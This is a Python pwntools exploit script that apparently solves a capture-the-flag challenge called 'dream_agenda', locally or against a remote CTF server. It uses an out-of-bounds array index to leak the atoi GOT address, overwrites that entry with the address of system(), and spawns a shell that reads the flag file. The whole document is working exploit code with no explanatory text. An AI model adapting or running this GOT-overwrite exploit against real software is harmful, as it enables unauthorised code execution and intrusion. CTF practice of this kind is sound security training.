#!/usr/bin/env python2

import sys
from pwn import *

def get_number(i):
    p.sendline('4')
    s = p.recv()
    p.sendline('%d' % int(i))
    num = p.recvline()
    p.recvuntil('>> ')
    if 'Cannot show that number!' in num:
        return -1
    elif 'Number:' in num:
        return int(num.split(':')[1].strip())

def edit_number(i, num):
    p.sendline('2')
    s = p.recv()
    p.sendline('%d' % int(i))
    res = p.recv()
    if 'Cannot edit that number!' in res:
        return 0
    p.sendline('%d' % int(num))
    res = p.recvline()
    p.recvuntil('>> ')
    if 'Number edited succesfully' in res:
        return 1
    return 0


elf = ELF('./dream_agenda')

if sys.argv[1]=='local':
    p = process('./dream_agenda')
    libc = ELF('./libc-local.so.6')
    system_offset = libc.symbols['system'] - libc.symbols['atoi']
elif sys.argv[1]=='remote':
    p = remote('ctf.h-c0n.com', 60001)
    system_offset = 0xe510 # libc6_2.23-0ubuntu11_amd64
else:
    exit()

atoi = elf.got['atoi']
numbers = elf.symbols['numbers']

log.info("atoi:     " + hex(atoi))
log.info("number[]: " + hex(numbers))

s = p.recvuntil('>> ')

ATOI = get_number((atoi - numbers)/8)
log.info("ATOI address: " + hex(ATOI))

SYSTEM = ATOI + system_offset
edit_number((atoi - numbers)/8, SYSTEM)

p.sendline('/bin/sh')
p.sendline('ls -l flag')
print(p.recv())
p.sendline('cat flag')
print(p.recv())

p.close()
